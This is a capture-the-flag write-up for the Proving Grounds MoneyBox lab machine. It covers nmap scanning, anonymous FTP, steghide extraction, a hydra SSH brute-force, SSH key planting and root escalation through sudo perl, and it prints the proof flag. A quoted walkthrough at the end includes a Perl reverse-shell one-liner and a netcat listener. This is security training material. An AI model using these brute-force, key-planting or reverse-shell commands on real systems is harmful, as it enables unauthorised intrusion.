---
title:
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/MoneyBoy]
└─$ sudo nmap -Pn -p- -sSCV -A -oN full_tcp-scan.txt --open $IP            
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 19:04 +0900
Nmap scan report for 192.168.203.230
Host is up (0.080s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.178
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)
|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)
|_  256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MoneyBox
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   80.27 ms 192.168.45.1
2   80.09 ms 192.168.45.254
3   80.43 ms 192.168.251.1
4   80.46 ms 192.168.203.230

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.04 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/MoneyBoy]
└─$ ftp 192.168.203.230
Connected to 192.168.203.230.
220 (vsFTPd 3.0.3)
Name (192.168.203.230:kali): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44067|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
226 Directory send OK.
ftp> mget trytofind.jpg
mget trytofind.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||33024|)
150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).
100% |***********************************************************************|  1068 KiB  122.77 KiB/s    00:00 ETA
226 Transfer complete.
1093656 bytes received in 00:08 (121.62 KiB/s)
ftp> exit
221 Goodbye.
```

![](../../../assets/images/Pasted%20image%2020260605032339.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/MoneyBoy]
└─$ steghide extract -sf trytofind.jpg


Enter passphrase: 
wrote extracted data to "data.txt".
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/MoneyBoy]
└─$ feroxbuster \
-u http://192.168.203.230 \
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.203.230/
 🚩  In-Scope Url          │ 192.168.203.230
 🚀  Threads               │ 25
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 💢  Status Code Filters   │ [403, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [html, git, php, txt, bak, zip, old]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       17l       88w      621c http://192.168.203.230/
200      GET       17l       88w      621c http://192.168.203.230/index.html
200      GET       48l       36w      353c http://192.168.203.230/blogs/
200      GET       48l       36w      353c http://192.168.203.230/blogs/index.html
```

view-source:http://192.168.203.230/blogs/index.html

![](../../../assets/images/Pasted%20image%2020260605025020.png)

view-source:http://192.168.201.230/S3cr3t-T3xt/index.html

![](../../../assets/images/Pasted%20image%2020260605025524.png)

3xtr4ctd4t4

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/MoneyBoy]
└─$ steghide extract -sf trytofind.jpg


Enter passphrase: 
wrote extracted data to "data.txt".
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/MoneyBoy]
└─$ cat data.txt   
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

renu

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/MoneyBoy]
└─$ hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.201.230                
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-05 03:26:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.201.230:22/
[22][ssh] host: 192.168.201.230   login: renu   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-05 03:27:02
```

---

# Initial Access

![](../../../assets/images/Pasted%20image%2020260605033911.png)
![](../../../assets/images/Pasted%20image%2020260605033940.png)

```zsh
renu@MoneyBox:/home/lily$ ssh-copy-id lily@192.168.201.230 -f
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/home/renu/.ssh/id_rsa.pub"

Number of key(s) added: 1

Now try logging into the machine, with:   "ssh 'lily@192.168.201.230'"
and check to make sure that only the key(s) you wanted were added.
```

```zsh
renu@MoneyBox:/home$ chmod 400 /home/renu/.ssh/id_rsa.pub
```

```zsh
renu@MoneyBox:/home$ ssh -i /home/renu/.ssh/id_rsa lily@localhost
Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 26 09:07:47 2021 from 192.168.43.80
```

```zsh
lily@MoneyBox:~$ whoami
lily
```

---

# Privilege Escalation


```zsh
lily@MoneyBox:~$ sudo -l
Matching Defaults entries for lily on MoneyBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
```

```zsh
ily@MoneyBox:~$ sudo /usr/bin/perl -e 'exec "/bin/sh"'
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/proof.txt
f385ed7dd0bb3a57d18d992f403703d8
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens35: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:50:56:ab:40:f4 brd ff:ff:ff:ff:ff:ff
    inet 192.168.201.230/24 brd 192.168.201.255 scope global ens35
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:40f4/64 scope link 
       valid_lft forever preferred_lft forever
# 
```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough
Close
Exploitation Guide for Moneybox
Summary
In this guide, we will thoroughly enumerate a web application to find a secret key which which we will use along with bruteforcing SSH in to gain initial access. We will escalate privileges by exploiting a vulnerable SUID binary in order to obtain root access.

Enumeration
We begin the enumeration process with an nmap scan.

┌──(kali㉿kali)-[~]
└─$ nmap 192.168.12.239
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-03 05:42 MST
Nmap scan report for MoneyBox.lan (192.168.12.239)
Host is up (0.0019s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
We see ports 21, 22, and 80 open on the target machine.

Starting with port 80 we see the following webpage.


home
home
Turning our attention toward content discovery, we can bruteforce directories using gobuster.

From the output we see the /blogs/ directory, which reveals the following webpage.


hidden
hidden
Viewing the source of the webpage, a hint reveals a hidden directory /S3cr3t-T3xt/.

┌──(kali㉿kali)-[~]
└─$ curl http://192.168.12.239/blogs/
<html>
<head><title>MoneyBox</title></head>
<body>
    <h1>I'm T0m-H4ck3r</h1>
        <p>I Already Hacked This Box and Informed.But They didn't Do any Security configuration</p>
        <p>If You Want Hint For Next Step......?<p>
</body>
</html>
....
<!--the hint is the another secret directory is S3cr3t-T3xt-->
Navigating to /S3cr3t-T3xt/, we are redirected to the following webpage.


third
third
Viewing the source of the webpage, a hint reveals a secret key 3xtr4ctd4t4.

┌──(kali㉿kali)-[~]
└─$ curl http://192.168.12.239/S3cr3t-T3xt/
<html>
<head><title>MoneyBox</title></head>
<body>
    <h1>There is Nothing In this Page.........</h1>
</body>
</html>
.....

<!..Secret Key 3xtr4ctd4t4 >
Moving on to port 21, we login with default credentials and find a file trytofind.jpg.

┌──(kali㉿kali)-[~]
└─$ ftp 192.168.12.239       
Connected to 192.168.12.239.
220 (vsFTPd 3.0.3)
Name (192.168.12.239:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||58729|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
226 Directory send OK.
We download trytofind.jpg to our machine for further analysis.

tp> get trytofind.jpg
local: trytofind.jpg remote: trytofind.jpg
229 Entering Extended Passive Mode (|||6207|)
150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).
100% |********************************|  1068 KiB   28.93 MiB/s    00:00 ETA
226 Transfer complete.
1093656 bytes received in 00:00 (27.89 MiB/s)
ftp> 
Opening the file reveals a plain image.

We can use steghide to analyze any information hidden in the image using steganography.

However when attempting to extract interesting ifnromation, we see that the file is password protected.

┌──(kali㉿kali)-[~]
└─$ steghide --extract -sf trytofind.jpg 
Enter passphrase: 
Turning to the secret key we found during our earlier enumeration, we can enter 3xtr4ctd4t4 to bypass the password restriction.

┌──(kali㉿kali)-[~]
└─$ steghide --extract -sf trytofind.jpg 
Enter passphrase: 
wrote extracted data to "data.txt".
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat data.txt              
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
We found another hint hidden in trytofind.jpg which reveals that the user renu is warned about using a very weak password.

We will now attempt to brute force SSH for the username renu using hydra.

┌──(kali㉿kali)-[~]
└─$ hydra -l renu -P rockyou.txt 192.168.12.239 ssh 
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-29 06:04:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.12.239:22/
[22][ssh] host: 192.168.12.239   login: renu   password: 987654321
1 of 1 target successfully completed, 1 valid password found
From the output we see the password 987654321.

We can login to SSH with the credentials renu:987654321.

┌──(kali㉿kali)-[~]
└─$ ssh renu@192.168.12.239
renu@192.168.12.239's password: 
Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct  3 06:05:07 2022 from 192.168.12.134
renu@MoneyBox:~$ id
uid=1001(renu) gid=1001(renu) groups=1001(renu)
Privilege Escalation
Once on the box, we see two users renu and lily.

renu@MoneyBox:/home$ ls
lily  renu
Upon further enumeration, we find a private key for the user lily.

renu@MoneyBox:/home/lily/.ssh$ ls
authorized_keys
renu@MoneyBox:/home/lily/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian
We can use the private key to authenticate as the user lily directly from the victim machine.

renu@MoneyBox:/home/lily/.ssh$ ssh lily@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
......
lily@MoneyBox:~$ id
uid=1000(lily) gid=1000(lily) groups=1000(lily),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
Checking permissions using sudo -l, we see that the user lily is permitted to run /usr/bin/perl.

lily@MoneyBox:~$ sudo -l
Matching Defaults entries for lily on MoneyBox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
Using a perl reverse shell payload, we can attempt to escalate privileges.

We begin by setting up a listener on our attack machine.

┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 1234 
Now we enter our reverse shell payload on our victim machine.

lily@MoneyBox:~$ sudo perl -e 'use Socket;$i="192.168.12.134";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
We have obtained root access.

┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 1234                      
[sudo] password for kali: 
listening on [any] 1234 ...
connect to [192.168.12.134] from (UNKNOWN) [192.168.12.239] 34912
# id
uid=0(root) gid=0(root) groups=0(root)
```

</details>